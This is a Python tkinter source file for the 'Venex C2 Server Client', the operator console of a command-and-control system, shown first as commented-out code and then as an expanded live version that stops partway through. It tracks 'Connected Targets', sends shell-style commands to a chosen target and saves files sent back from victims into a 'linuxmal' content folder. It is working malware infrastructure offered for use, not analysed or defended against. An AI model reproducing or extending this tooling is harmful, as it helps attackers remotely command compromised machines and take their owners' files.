# import base64
# import socket
# import threading
# import time
# import tkinter as tk
# from tkinter import ttk, scrolledtext, messagebox
# from datetime import datetime, timedelta
# from queue import Queue
# import re
# import ipaddress

# RED = "\033[31m"
# GREEN = "\033[32m"
# YELLOW = "\033[33m"
# RESET = "\033[0m"

# class C2Client:
#     def __init__(self, root):
#         self.root = root
#         self.root.title("Venex C2 Server Client")
#         self.root.geometry("1000x700")
        
#         # Theme variables
#         self.dark_mode = True
#         self.setup_theme()
        
#         # Connection variables
#         self.server_ip = tk.StringVar(value="127.0.0.1")
#         self.server_port = tk.IntVar(value=7777)
#         self.connected = False
#         self.socket = None
#         self.receive_thread = None
        
#         # Target tracking
#         self.targets = {}  # {target_id: {"last_seen": timestamp, "socket": socket_info}}
#         self.target_lock = threading.Lock()
        
#         # Interaction state
#         self.interacting_with_target = None
        
#         # GUI update queue
#         self.gui_queue = Queue()
        
#         # Setup GUI
#         self.setup_gui()
        
#         # Start the cleanup thread
#         self.cleanup_thread = threading.Thread(target=self.cleanup_old_targets, daemon=True)
#         self.cleanup_thread.start()
        
#         # Start processing GUI updates
#         self.process_gui_updates()

#     def setup_theme(self):
#         if self.dark_mode:
#             # Dark theme colors
#             self.bg_color = "#252525"         # almost black background
#             self.fg_color = "#e6e6e6"         # light gray text
#             self.entry_bg = "#1a1a1a"         # darker entry fields
#             self.button_bg = "#262626"        # dark buttons
#             self.tree_bg = "#1f1f1f"          # darker treeview background
#             self.tree_fg = "#e6e6e6"          # light gray tree text
#             self.tree_selected = "#D3362B"    # selected row slightly lighter
#             self.text_bg = "#1a1a1a"          # dark text area background
#             self.text_fg = "#e6e6e6"          # light text color
#             self.frame_bg = "#252525"         # dark frame background
#             self.data_color = "#22DD22"
#         else:
#             # Light theme colors
#             self.bg_color = "#ffffff"         # main background
#             self.fg_color = "#000000"         # main text color
#             self.entry_bg = "#f0f0f0"         # entry fields background
#             self.button_bg = "#e0e0e0"        # buttons background
#             self.tree_bg = "#ffffff"          # treeview background
#             self.tree_fg = "#000000"          # treeview text color
#             self.tree_selected = "#c53d3d"    # selected row highlight
#             self.text_bg = "#f5f5f5"          # text area background
#             self.text_fg = "#000000"          # text area color
#             self.frame_bg = "#f7f7f7"         # frame background
#             self.data_color = "#002BB8"
        
#         # Apply to root window
#         self.root.configure(bg=self.bg_color)
        
#         # Configure style
#         self.style = ttk.Style()
#         self.style.theme_use('clam')
        
#         # Configure ttk styles
#         self.style.configure('.', background=self.bg_color, foreground=self.fg_color)
#         self.style.configure('TFrame', background=self.frame_bg)
#         self.style.configure('TLabel', background=self.frame_bg, foreground=self.fg_color)
#         self.style.configure('TButton', background=self.button_bg, foreground=self.fg_color)
#         self.style.configure('TEntry', fieldbackground=self.entry_bg, foreground=self.fg_color)
#         self.style.configure('TScrollbar', background=self.button_bg, troughcolor=self.bg_color)
#         self.style.configure('Treeview', 
#                             background=self.tree_bg, 
#                             foreground=self.tree_fg,
#                             fieldbackground=self.tree_bg)
#         self.style.map('Treeview', background=[('selected', self.tree_selected)])
#         self.style.configure('Treeview.Heading', 
#                             background=self.button_bg, 
#                             foreground=self.fg_color)
#         self.style.configure('TLabelframe', background=self.frame_bg, foreground=self.fg_color)
#         self.style.configure('TLabelframe.Label', background=self.frame_bg, foreground=self.fg_color)

#     def toggle_theme(self):
#         """Toggle between dark and light mode"""
#         self.dark_mode = not self.dark_mode
#         self.setup_theme()
#         self.refresh_widget_colors()

#     def refresh_widget_colors(self):
#         """Refresh widget colors after theme change"""
#         # Refresh messages text widgets
#         self.messages_text.config(bg=self.text_bg, fg=self.text_fg, insertbackground=self.fg_color)
#         self.data_messages_text.config(bg=self.text_bg, fg=self.data_color, insertbackground=self.data_color)
        
#         # Refresh target menu
#         self.target_menu.config(bg=self.button_bg, fg=self.fg_color)

#     def setup_gui(self):
#         # Main container with left and right panes
#         main_paned = ttk.PanedWindow(self.root, orient=tk.HORIZONTAL)
#         main_paned.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=10, pady=5)

#         # Left frame (Targets and Connection info) - larger
#         left_frame = ttk.Frame(main_paned)
#         main_paned.add(left_frame, weight=1)  # Larger weight = more space

#         # Right frame (Data messages) - very small
#         right_frame = ttk.Frame(main_paned)
#         main_paned.add(right_frame, weight=1)  # Smaller weight = less space
        
#         # Connection frame
#         connection_frame = ttk.Frame(self.root, padding="10")
#         connection_frame.grid(row=0, column=0, sticky=(tk.W, tk.E))
        
#         ttk.Label(connection_frame, text="Server IP:").grid(row=0, column=0, sticky=tk.W)
#         ip_entry = ttk.Entry(connection_frame, textvariable=self.server_ip, width=15)
#         ip_entry.grid(row=0, column=1, sticky=tk.W)
        
#         ttk.Label(connection_frame, text="Port:").grid(row=0, column=2, sticky=tk.W)
#         port_entry = ttk.Entry(connection_frame, textvariable=self.server_port, width=10)
#         port_entry.grid(row=0, column=3, sticky=tk.W)
        
#         self.connect_btn = ttk.Button(connection_frame, text="Connect", command=self.toggle_connection)
#         self.connect_btn.grid(row=0, column=4, padx=5)
        
#         # Theme toggle button
#         self.theme_btn = ttk.Button(connection_frame, text="☀️", command=self.toggle_theme, width=3)
#         self.theme_btn.grid(row=0, column=5, padx=5)
        
#         # Targets frame (Left side)
#         targets_frame = ttk.LabelFrame(left_frame, text="Connected Targets", padding="10")
#         targets_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(0, 5), pady=5)
        
#         # Treeview for targets
#         columns = ("target_id", "last_seen", "status")
#         self.targets_tree = ttk.Treeview(targets_frame, columns=columns, show="headings")
#         self.targets_tree.heading("target_id", text="Target ID")
#         self.targets_tree.heading("last_seen", text="Last Seen")
#         self.targets_tree.heading("status", text="Status")
        
#         self.targets_tree.column("target_id", width=200)
#         self.targets_tree.column("last_seen", width=150)
#         self.targets_tree.column("status", width=100)
        
#         # Scrollbar for treeview
#         tree_scroll = ttk.Scrollbar(targets_frame, orient=tk.VERTICAL, command=self.targets_tree.yview)
#         self.targets_tree.configure(yscrollcommand=tree_scroll.set)
        
#         self.targets_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
#         tree_scroll.grid(row=0, column=1, sticky=(tk.N, tk.S))
        
#         # Messages frame (Left side - for connection and target messages)
#         data_messages_frame = ttk.LabelFrame(left_frame, text="Data Messages", padding="10")
#         data_messages_frame.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(0, 5), pady=5)
        
#         self.data_messages_text = scrolledtext.ScrolledText(data_messages_frame, width=70, height=15, 
#                                                      bg=self.text_bg, fg=self.data_color,
#                                                      insertbackground=self.data_color)
#         self.data_messages_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
#         # # Data Messages frame (Right side - for DATA messages only)
#         messages_frame = ttk.LabelFrame(right_frame, text="Connection Messages", padding="10")
#         messages_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(5, 0), pady=5)
        
#         self.messages_text = scrolledtext.ScrolledText(messages_frame, width=30, height=20, 
#                                                           bg=self.text_bg, fg=self.text_fg,
#                                                           insertbackground=self.fg_color)
#         self.messages_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
#         # Command frame (Bottom - spans both columns)
#         command_frame = ttk.Frame(self.root, padding="10")
#         command_frame.grid(row=2, column=0, sticky=(tk.W, tk.E))

#         # Mode row frame
#         mode_frame = ttk.Frame(command_frame)
#         mode_frame.grid(row=0, column=0, sticky=(tk.W, tk.E))

#         # Command row frame
#         cmd_frame = ttk.Frame(command_frame)
#         cmd_frame.grid(row=1, column=0, sticky=(tk.W, tk.E))

#         # Mode row content
#         self.interaction_status = ttk.Label(mode_frame, text="Mode: C2")
#         self.interaction_status.grid(row=0, column=0, sticky=tk.W)

#         self.normal_mode_btn = ttk.Button(mode_frame, text="C2 mode", 
#                                         command=self.switch_to_normal_mode, state=tk.DISABLED)
#         self.normal_mode_btn.grid(row=0, column=1, padx=5, sticky=tk.W)

#         # Command row content
#         ttk.Label(cmd_frame, text="Command:").grid(row=0, column=0, sticky=tk.W)
#         self.command_entry = ttk.Entry(cmd_frame, width=50)
#         self.command_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=5)
#         self.command_entry.bind("<Return>", self.send_command)

#         ttk.Button(cmd_frame, text="Send", command=self.send_command).grid(row=0, column=2, padx=5)

#         # Configure column weights for each sub-frame
#         mode_frame.columnconfigure(0, weight=1)
#         mode_frame.columnconfigure(1, weight=0)

#         cmd_frame.columnconfigure(0, weight=0)
#         cmd_frame.columnconfigure(1, weight=1)
#         cmd_frame.columnconfigure(2, weight=0)

#         # Configure main command frame
#         command_frame.columnconfigure(0, weight=1)
        
#         # Configure grid weights for left and right frames
#         left_frame.columnconfigure(0, weight=1)
#         left_frame.rowconfigure(0, weight=1)
#         left_frame.rowconfigure(1, weight=1)
        
#         right_frame.columnconfigure(0, weight=1)
#         right_frame.rowconfigure(0, weight=1)
        
#         targets_frame.columnconfigure(0, weight=1)
#         targets_frame.rowconfigure(0, weight=1)
        
#         data_messages_frame.columnconfigure(0, weight=1)
#         data_messages_frame.rowconfigure(0, weight=1)
        
#         messages_frame.columnconfigure(0, weight=1)
#         messages_frame.rowconfigure(0, weight=1)

#         # Configure main window grid weights
#         self.root.columnconfigure(0, weight=1)
#         self.root.rowconfigure(1, weight=1)

#         # Right-click menu for targets
#         self.target_menu = tk.Menu(self.root, tearoff=0, bg=self.button_bg, fg=self.fg_color)
#         self.target_menu.add_command(label="Interact", command=self.interact_with_target)
        
#         # Bind right-click to treeview
#         self.targets_tree.bind("<Button-3>", self.show_target_menu)

#     def process_gui_updates(self):
#         """Process all pending GUI updates from the queue"""
#         try:
#             while True:
#                 # Get all pending updates (non-blocking)
#                 callback, args = self.gui_queue.get_nowait()
#                 callback(*args)
#         except:
#             pass  # Queue is empty
        
#         # Schedule next check
#         self.root.after(100, self.process_gui_updates)

#     def show_target_menu(self, event):
#         """Show context menu on right-click"""
#         item = self.targets_tree.identify_row(event.y)
#         if item:
#             self.targets_tree.selection_set(item)
#             self.target_menu.post(event.x_root, event.y_root)

#     def interact_with_target(self):
#         """Set interaction with selected target"""
#         selected = self.targets_tree.selection()
#         if selected:
#             target_id = self.targets_tree.item(selected[0], "values")[0]
#             self.interacting_with_target = target_id
#             self.interaction_status.config(text=f"Mode: Interacting with {target_id}")
#             self.normal_mode_btn.config(state=tk.NORMAL)
#             self.log_message(f"Now interacting with target: {target_id}")

#     def switch_to_normal_mode(self):
#         """Switch back to normal command mode"""
#         self.interacting_with_target = None
#         self.interaction_status.config(text="Mode: C2")
#         self.normal_mode_btn.config(state=tk.DISABLED)
#         self.log_message("Switched back to normal mode")

#     def toggle_connection(self):
#         if not self.connected:
#             self.connect_to_server()
#         else:
#             self.disconnect_from_server()
    
#     def is_ip(self, addr):
#         """Check if the input is a valid IPv4 or IPv6 address"""
#         try:
#             ipaddress.ip_address(addr)
#             return True
#         except ValueError:
#             return False

#     def resolve_host(self, host):
#         """Resolve a domain name to an IP address"""
#         try:
#             return socket.gethostbyname(host)
#         except socket.gaierror:
#             return None

#     def connect_to_server(self):
#         host_input = self.server_ip.get()

#         # Determine IP
#         if self.is_ip(host_input):
#             ip = host_input
#         else:
#             ip = self.resolve_host(host_input)
#             if ip is None:
#                 messagebox.showerror("Error", f"Cannot resolve domain: {host_input}")
            
#         try:
#             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             self.socket.connect((self.server_ip.get(), self.server_port.get()))
#             self.connected = True
#             self.connect_btn.config(text="Disconnect")
            
#             # Start receive thread
#             self.receive_thread = threading.Thread(target=self.receive_messages, daemon=True)
#             self.receive_thread.start()
            
#             self.log_message("Connected to server")
            
#         except Exception as e:
#             messagebox.showerror("Connection Error", f"Failed to connect: {str(e)}")

#     def disconnect_from_server(self):
#         self.connected = False
#         if self.socket:
#             self.socket.close()
#             self.socket = None
        
#         self.connect_btn.config(text="Connect")
#         self.log_message("Disconnected from server")
        
#         # Clear targets
#         with self.target_lock:
#             self.targets.clear()
#             # Queue the treeview clearing operation
#             self.gui_queue.put((self._clear_targets_tree, ()))
        
#         # Reset interaction state
#         self.switch_to_normal_mode()

#     def send_command(self, event=None):
#         if not self.connected:
#             messagebox.showwarning("Not Connected", "Not connected to server")
#             return
            
#         command = self.command_entry.get()
#         if not command:
#             return
            
#         try:
#             # Format command based on interaction mode
#             if self.interacting_with_target:
#                 formatted_command = f"TARGET:{self.interacting_with_target}:{command}"
#             else:
#                 formatted_command = command
                
#             self.socket.sendall((formatted_command + "\n").encode())
#             self.command_entry.delete(0, tk.END)
#             self.log_message(f"Sent: {formatted_command}")
#         except Exception as e:
#             self.log_message(f"Error sending command: {str(e)}")

#     def receive_messages(self):
#         buffer = b""
#         while self.connected:
#             try:
#                 data = self.socket.recv(4096)
#                 if not data:
#                     break  # connection closed

#                 buffer += data

#                 # process complete messages only
#                 while b"END_OF" in buffer:
#                     line, buffer = buffer.split(b"END_OF", 1)
#                     line = line.strip()
                    
#                     if line:
#                         self.process_message(line)

#             except Exception as e:
#                 if self.connected:
#                     self.log_message(f"Error receiving data: {str(e)}")
#                 break

#         if self.connected:
#             self.gui_queue.put((self.disconnect_from_server, ()))

#     def process_message(self, message):
#         # print(message)
#         # Check if this is a target registration message
#         if message.startswith(b"TARGET:"):
#             # Extract target ID from previous command
#             target_id = message[7:].strip().decode('utf-8')
#             self.add_target(target_id)
        
#         elif message.startswith(b"/DATA:"):
#             message = message[5:].decode('utf-8')  # remove "DATA:"
#             lines = message.split("\n")  # split into all lines
#             self.gui_queue.put((self.log_data_message, (f"",)))
#             for line in lines:
#                 if line.strip():  # optional: skip empty lines
#                     clean_line = re.sub(r'\s+$', '', line)
#                     self.gui_queue.put((self.log_data_message, (f" $$-> {clean_line}",)))

#         elif message.startswith(b"/WRITE:"):

#             try:
#                 # Split only first two ":" so base64 remains untouched
#                 _, filename, ext, b64data = message.split(b":", 3)

#                 filename = filename.decode('utf-8')
#                 ext = ext.decode('utf-8')

#                 # Convert Base64 → raw bytes
#                 file_bytes = b64data

#                 # Create filename
#                 filename = f"D:\\linuxmal\\C2Client\\content_box\\{filename}.{ext.lower()}"

#                 # Save file
#                 with open(filename, "wb") as f:
#                     f.write(file_bytes)

#                 self.log_message(f"Saved file as {filename}")

#             except Exception as e:
#                 self.log_message(f"Error handling WRITE message: {e}")
#         else:
#             self.gui_queue.put((self.log_message, (f"Received: {message.decode("utf-8")}",)))

#     def add_target(self, target_id):
#         with self.target_lock:

#             if target_id not in self.targets:
#                 # Create new entry
#                 self.targets[target_id] = {
#                     "last_seen": datetime.now(),
#                     "status": "Active"
#                 }

#                 # Add to treeview via queue
#                 self.gui_queue.put((self._add_target_to_tree, (target_id,)))
#                 self.gui_queue.put((self.log_message, (f"New target connected: {target_id}",)))
#             else:
#                 # Update existing entry
#                 self.targets[target_id]["last_seen"] = datetime.now()
#                 self.gui_queue.put((self._update_target_in_tree, (target_id,)))

#     def update_target(self, target_id):
#         with self.target_lock:
#             if target_id in self.targets:
#                 self.targets[target_id]["last_seen"] = datetime.now()
#                 self.targets[target_id]["status"] = "Active"
                
#                 # Update treeview via queue
#                 self.gui_queue.put((self._update_target_in_tree, (target_id,)))

#     def remove_target(self, target_id):
#         with self.target_lock:
#             if target_id in self.targets:
#                 del self.targets[target_id]
                
#                 # Remove from treeview via queue
#                 self.gui_queue.put((self._remove_target_from_tree, (target_id,)))
#                 self.gui_queue.put((self.log_message, (f"Target removed: {target_id}",)))
                
#                 # If we were interacting with this target, switch to normal mode
#                 if self.interacting_with_target == target_id:
#                     self.gui_queue.put((self.switch_to_normal_mode, ()))

#     def _clear_targets_tree(self):
#         """Clear all items from the targets treeview"""
#         for item in self.targets_tree.get_children():
#             self.targets_tree.delete(item)

#     def _add_target_to_tree(self, target_id):
#         with self.target_lock:
#             if target_id in self.targets:
#                 target = self.targets[target_id]
#                 self.targets_tree.insert("", "end", values=(
#                     target_id, 
#                     target["last_seen"].strftime("%H:%M:%S"),
#                     target["status"]
#                 ))

#     def _update_target_in_tree(self, target_id):
#         with self.target_lock:
#             if target_id in self.targets:
#                 target = self.targets[target_id]
                
#                 # Find the item in the treeview
#                 for item in self.targets_tree.get_children():
#                     if self.targets_tree.item(item, "values")[0] == target_id:
#                         self.targets_tree.item(item, values=(
#                             target_id,
#                             target["last_seen"].strftime("%H:%M:%S"),
#                             target["status"]
#                         ))
#                         break

#     def _remove_target_from_tree(self, target_id):
#         # Find and remove the item from the treeview
#         for item in self.targets_tree.get_children():
#             if self.targets_tree.item(item, "values")[0] == target_id:
#                 self.targets_tree.delete(item)
#                 break

#     def cleanup_old_targets(self):
#         """Remove targets that haven't been seen in 5 minutes"""
#         while True:
#             time.sleep(30)  # Check every 30 seconds
            
#             if not self.connected:
#                 continue
                
#             now = datetime.now()
#             to_remove = []
            
#             with self.target_lock:
#                 for target_id, target_info in self.targets.items():
#                     if now - target_info["last_seen"] > timedelta(minutes=5):
#                         to_remove.append(target_id)
            
#             for target_id in to_remove:
#                 self.remove_target(target_id)

#     def log_message(self, message):
#         """Log general messages to the left message window"""
#         timestamp = datetime.now().strftime("%H:%M:%S")
#         self.messages_text.insert(tk.END, f"[{timestamp}] {message}\n")
#         self.messages_text.see(tk.END)

#     def log_data_message(self, message):
#         """Log DATA messages to the right message window"""
#         # Configure tag for the specified color if it doesn't exist

#         self.data_messages_text.insert(tk.END, f"{message}\n")
#         self.data_messages_text.see(tk.END)

#     def __del__(self):
#         self.connected = False
#         if self.socket:
#             self.socket.close()

# if __name__ == "__main__":
#     root = tk.Tk()
#     app = C2Client(root)
#     root.protocol("WM_DELETE_WINDOW", root.quit)
#     root.mainloop()

import base64
import socket
import threading
import time
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from datetime import datetime, timedelta
from queue import Queue
import re
import ipaddress
import os
import subprocess
import platform

RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
RESET = "\033[0m"

class C2Client:
    def __init__(self, root):
        self.root = root
        self.root.title("Venex C2 Server Client")
        self.root.geometry("1200x800")  # Increased width for new tab
        
        # Theme variables
        self.dark_mode = True
        self.setup_theme()
        
        # Connection variables
        self.server_ip = tk.StringVar(value="127.0.0.1")
        self.server_port = tk.IntVar(value=7777)
        self.connected = False
        self.socket = None
        self.receive_thread = None
        
        # Target tracking
        self.targets = {}  # {target_id: {"last_seen": timestamp, "socket": socket_info}}
        self.target_lock = threading.Lock()
        
        # Interaction state
        self.interacting_with_target = None
        
        # GUI update queue
        self.gui_queue = Queue()
        
        # File explorer variables
        self.content_box_path = "D:\\linuxmal\\C2Client\\content_box"
        self.current_path = self.content_box_path
        
        # Create content box directory if it doesn't exist
        if not os.path.exists(self.content_box_path):
            os.makedirs(self.content_box_path)
        
        # Setup GUI
        self.setup_gui()
        
        # Start the cleanup thread
        self.cleanup_thread = threading.Thread(target=self.cleanup_old_targets, daemon=True)
        self.cleanup_thread.start()
        
        # Start processing GUI updates
        self.root.after(100, self.process_gui_updates)
        
        # Initialize file explorer
        self.refresh_file_explorer()

    def setup_theme(self):
        if self.dark_mode:
            # Dark theme colors
            self.bg_color = "#252525"         # almost black background
            self.fg_color = "#e6e6e6"         # light gray text
            self.entry_bg = "#1a1a1a"         # darker entry fields
            self.button_bg = "#262626"        # dark buttons
            self.tree_bg = "#1f1f1f"          # darker treeview background
            self.tree_fg = "#e6e6e6"          # light gray tree text
            self.tree_selected = "#D3362B"    # selected row slightly lighter
            self.text_bg = "#1a1a1a"          # dark text area background
            self.text_fg = "#e6e6e6"          # light text color
            self.frame_bg = "#252525"         # dark frame background
            self.data_color = "#22DD22"
            self.highlight_color = "#2a2a2a"  # For file explorer selection
        else:
            # Light theme colors
            self.bg_color = "#ffffff"         # main background
            self.fg_color = "#000000"         # main text color
            self.entry_bg = "#f0f0f0"         # entry fields background
            self.button_bg = "#e0e0e0"        # buttons background
            self.tree_bg = "#ffffff"          # treeview background
            self.tree_fg = "#000000"          # treeview text color
            self.tree_selected = "#c53d3d"    # selected row highlight
            self.text_bg = "#f5f5f5"          # text area background
            self.text_fg = "#000000"          # text area color
            self.frame_bg = "#f7f7f7"         # frame background
            self.data_color = "#002BB8"
            self.highlight_color = "#f0f0f0"  # For file explorer selection
        
        # Apply to root window
        self.root.configure(bg=self.bg_color)
        
        # Configure style
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Configure ttk styles
        self.style.configure('.', background=self.bg_color, foreground=self.fg_color)
        self.style.configure('TFrame', background=self.frame_bg)
        self.style.configure('TLabel', background=self.frame_bg, foreground=self.fg_color)
        self.style.configure('TButton', background=self.button_bg, foreground=self.fg_color)
        self.style.configure('TEntry', fieldbackground=self.entry_bg, foreground=self.fg_color)
        self.style.configure('TScrollbar', background=self.button_bg, troughcolor=self.bg_color)
        self.style.configure('Treeview', 
                            background=self.tree_bg, 
                            foreground=self.tree_fg,
                            fieldbackground=self.tree_bg)
        self.style.map('Treeview', background=[('selected', self.tree_selected)])
        self.style.configure('Treeview.Heading', 
                            background=self.button_bg, 
                            foreground=self.fg_color)
        self.style.configure('TLabelframe', background=self.frame_bg, foreground=self.fg_color)
        self.style.configure('TLabelframe.Label', background=self.frame_bg, foreground=self.fg_color)
        self.style.configure('TNotebook', background=self.bg_color)
        self.style.configure('TNotebook.Tab', background=self.button_bg, foreground=self.fg_color)
        self.style.map('TNotebook.Tab', 
                      background=[('selected', self.bg_color)],
                      foreground=[('selected', self.fg_color)])

    def toggle_theme(self):
        """Toggle between dark and light mode"""
        self.dark_mode = not self.dark_mode
        self.setup_theme()
        self.refresh_widget_colors()

    def refresh_widget_colors(self):
        """Refresh widget colors after theme change"""
        # Refresh messages text widgets
        self.messages_text.config(bg=self.text_bg, fg=self.text_fg, insertbackground=self.fg_color)
        self.data_messages_text.config(bg=self.text_bg, fg=self.data_color, insertbackground=self.data_color)
        
        # Refresh target menu
        self.target_menu.config(bg=self.button_bg, fg=self.fg_color)
        
        # Refresh file explorer
        self.refresh_file_explorer()

    def setup_gui(self):
        # Create notebook for tabs
        self.notebook = ttk.Notebook(self.root)
        self.notebook.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=10, pady=5)
        
        # Tab 1: Main C2 Interface
        main_tab = ttk.Frame(self.notebook)
        self.notebook.add(main_tab, text="C2 Interface")
        
        # Tab 2: Content Box File Explorer
        content_tab = ttk.Frame(self.notebook)
        self.notebook.add(content_tab, text="Content Box")
        
        # Setup main tab (existing interface)
        self.setup_main_tab(main_tab)
        
        # Setup content box tab
        self.setup_content_tab(content_tab)
        
        # Connection frame (top of window, outside tabs)
        connection_frame = ttk.Frame(self.root, padding="10")
        connection_frame.grid(row=0, column=0, sticky=(tk.W, tk.E))
        
        ttk.Label(connection_frame, text="Server IP:").grid(row=0, column=0, sticky=tk.W)
        ip_entry = ttk.Entry(connection_frame, textvariable=self.server_ip, width=15)
        ip_entry.grid(row=0, column=1, sticky=tk.W)
        
        ttk.Label(connection_frame, text="Port:").grid(row=0, column=2, sticky=tk.W)
        port_entry = ttk.Entry(connection_frame, textvariable=self.server_port, width=10)
        port_entry.grid(row=0, column=3, sticky=tk.W)
        
        self.connect_btn = ttk.Button(connection_frame, text="Connect", command=self.toggle_connection)
        self.connect_btn.grid(row=0, column=4, padx=5)
        
        # Theme toggle button
        self.theme_btn = ttk.Button(connection_frame, text="☀️", command=self.toggle_theme, width=3)
        self.theme_btn.grid(row=0, column=5, padx=5)
        
        # Command frame (Bottom - spans both columns)
        command_frame = ttk.Frame(self.root, padding="10")
        command_frame.grid(row=2, column=0, sticky=(tk.W, tk.E))

        # Mode row frame
        mode_frame = ttk.Frame(command_frame)
        mode_frame.grid(row=0, column=0, sticky=(tk.W, tk.E))

        # Command row frame
        cmd_frame = ttk.Frame(command_frame)
        cmd_frame.grid(row=1, column=0, sticky=(tk.W, tk.E))

        # Mode row content
        self.interaction_status = ttk.Label(mode_frame, text="Mode: C2")
        self.interaction_status.grid(row=0, column=0, sticky=tk.W)

        self.normal_mode_btn = ttk.Button(mode_frame, text="C2 mode", 
                                        command=self.switch_to_normal_mode, state=tk.DISABLED)
        self.normal_mode_btn.grid(row=0, column=1, padx=5, sticky=tk.W)

        # Command row content
        ttk.Label(cmd_frame, text="Command:").grid(row=0, column=0, sticky=tk.W)
        self.command_entry = ttk.Entry(cmd_frame, width=50)
        self.command_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=5)
        self.command_entry.bind("<Return>", self.send_command)

        ttk.Button(cmd_frame, text="Send", command=self.send_command).grid(row=0, column=2, padx=5)

        # Configure column weights for each sub-frame
        mode_frame.columnconfigure(0, weight=1)
        mode_frame.columnconfigure(1, weight=0)

        cmd_frame.columnconfigure(0, weight=0)
        cmd_frame.columnconfigure(1, weight=1)
        cmd_frame.columnconfigure(2, weight=0)

        # Configure main command frame
        command_frame.columnconfigure(0, weight=1)
        
        # Configure main window grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(1, weight=1)

    def setup_main_tab(self, parent):
        # Main container with left and right panes
        main_paned = ttk.PanedWindow(parent, orient=tk.HORIZONTAL)
        main_paned.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Left frame (Targets and Connection info) - larger
        left_frame = ttk.Frame(main_paned)
        main_paned.add(left_frame, weight=1)  # Larger weight = more space

        # Right frame (Data messages) - very small
        right_frame = ttk.Frame(main_paned)
        main_paned.add(right_frame, weight=1)  # Smaller weight = less space
        
        # Targets frame (Left side)
        targets_frame = ttk.LabelFrame(left_frame, text="Connected Targets", padding="10")
        targets_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(0, 5), pady=5)
        
        # Treeview for targets
        columns = ("target_id", "last_seen", "status")
        self.targets_tree = ttk.Treeview(targets_frame, columns=columns, show="headings")
        self.targets_tree.heading("target_id", text="Target ID")
        self.targets_tree.heading("last_seen", text="Last Seen")
        self.targets_tree.heading("status", text="Status")
        
        self.targets_tree.column("target_id", width=200)
        self.targets_tree.column("last_seen", width=150)
        self.targets_tree.column("status", width=100)
        
        # Scrollbar for treeview
        tree_scroll = ttk.Scrollbar(targets_frame, orient=tk.VERTICAL, command=self.targets_tree.yview)
        self.targets_tree.configure(yscrollcommand=tree_scroll.set)
        
        self.targets_tree.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        tree_scroll.grid(row=0, column=1, sticky=(tk.N, tk.S))
        
        # Messages frame (Left side - for connection and target messages)
        data_messages_frame = ttk.LabelFrame(left_frame, text="Data Messages", padding="10")
        data_messages_frame.grid(row=1, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(0, 5), pady=5)
        
        self.data_messages_text = scrolledtext.ScrolledText(data_messages_frame, width=70, height=15, 
                                                     bg=self.text_bg, fg=self.data_color,
                                                     insertbackground=self.data_color)
        self.data_messages_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Data Messages frame (Right side - for DATA messages only)
        messages_frame = ttk.LabelFrame(right_frame, text="Connection Messages", padding="10")
        messages_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(5, 0), pady=5)
        
        self.messages_text = scrolledtext.ScrolledText(messages_frame, width=30, height=20, 
                                                          bg=self.text_bg, fg=self.text_fg,
                                                          insertbackground=self.fg_color)
        self.messages_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Right-click menu for targets
        self.target_menu = tk.Menu(self.root, tearoff=0, bg=self.button_bg, fg=self.fg_color)
        self.target_menu.add_command(label="Interact", command=self.interact_with_target)
        
        # Bind right-click to treeview
        self.targets_tree.bind("<Button-3>", self.show_target_menu)
        
        # Configure grid weights
        left_frame.columnconfigure(0, weight=1)
        left_frame.rowconfigure(0, weight=1)
        left_frame.rowconfigure(1, weight=1)
        
        right_frame.columnconfigure(0, weight=1)
        right_frame.rowconfigure(0, weight=1)
        
        targets_frame.columnconfigure(0, weight=1)
        targets_frame.rowconfigure(0, weight=1)
        
        data_messages_frame.columnconfigure(0, weight=1)
        data_messages_frame.rowconfigure(0, weight=1)
        
        messages_frame.columnconfigure(0, weight=1)
        messages_frame.rowconfigure(0, weight=1)
        
        parent.columnconfigure(0, weight=1)
        parent.rowconfigure(0, weight=1)

    def setup_content_tab(self, parent):
        """Setup the Content Box file explorer tab"""
        # Top frame for navigation and buttons
        nav_frame = ttk.Frame(parent)
        nav_frame.grid(row=0, column=0, sticky=(tk.W, tk.E), padx=10, pady=(10, 5))
        
        # Back button
        self.back_btn = ttk.Button(nav_frame, text="← Back", command=self.navigate_back)
        self.back_btn.grid(row=0, column=0, padx=(0, 5))
        
        # Up button
        self.up_btn = ttk.Button(nav_frame, text="↑ Up", command=self.navigate_up)
        self.up_btn.grid(row=0, column=1, padx=5)
        
        # Refresh button
        self.refresh_btn = ttk.Button(nav_frame, text="↻ Refresh", command=self.refresh_file_explorer)
        self.refresh_btn.grid(row=0, column=2, padx=5)
        
        # Path label
        self.path_label = ttk.Label(nav_frame, text="")
        self.path_label.grid(row=0, column=3, padx=10, sticky=tk.W)
        
        # Tool buttons frame
        tool_frame = ttk.Frame(parent)
        tool_frame.grid(row=1, column=0, sticky=(tk.W, tk.E), padx=10, pady=(0, 5))
        
        # Open button
        self.open_btn = ttk.Button(tool_frame, text="Open", command=self.open_selected_file)
        self.open_btn.grid(row=0, column=0, padx=(0, 5))
        
        # Delete button
        self.delete_btn = ttk.Button(tool_frame, text="Delete", command=self.delete_selected_file)
        self.delete_btn.grid(row=0, column=1, padx=5)
        
        # # Upload button
